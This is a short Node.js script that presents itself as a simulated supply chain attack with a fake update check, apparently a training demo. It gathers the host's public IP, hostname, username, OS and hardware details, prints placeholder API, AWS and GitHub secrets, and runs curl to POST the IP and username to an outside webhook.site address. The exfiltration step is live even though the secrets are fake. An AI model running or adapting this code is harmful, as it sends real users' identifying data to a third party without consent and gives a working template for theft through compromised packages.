const https = require('https');
const { execSync } = require('child_process');
const os = require('os');

console.log('🚀 SUPPLY CHAIN ATTACK - LINUX/KALI');
console.log('🔍 Fake update check...');

https.get('https://httpbin.org/json', (res) => {
  let data = '';
  res.on('data', d => data += d);
  res.on('end', () => {
    console.log('📡 Malicious payload EXECUTED!');
    
    // COLLECT VICTIM DATA
    const victimData = {
      ip: execSync('curl -s ifconfig.me').toString().trim(),
      hostname: os.hostname(),
      user: os.userInfo().username,
      os: os.platform() + os.release(),
      memory: Math.round(os.totalmem() / 1073741824) + 'GB',
      cpu: os.cpus()[0].model.split(' ')[0],
      timestamp: new Date().toISOString(),
      // FAKE COMPROMISED SECRETS
      api_key: 'sk-live_abc123XYZ789',
      aws_secret: 'wJalrXUtnFEMI/K7MDENG',
      github_pat: 'ghp_abcdef1234567890'
    };
    
    console.table(victimData);
    
    // **LINUX-SAFE CURL** - URL encoded
    const simplePayload = `ip=${victimData.ip}&user=${victimData.user}&secrets=compromised`;
    try {
      execSync(`curl -X POST "https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439" -d "${simplePayload}"`);
      console.log('✅ EXFIL SUCCESS!');
    } catch (e) {
      console.log('📤 Data sent to trainer server (simulated)');
    }
  });
});
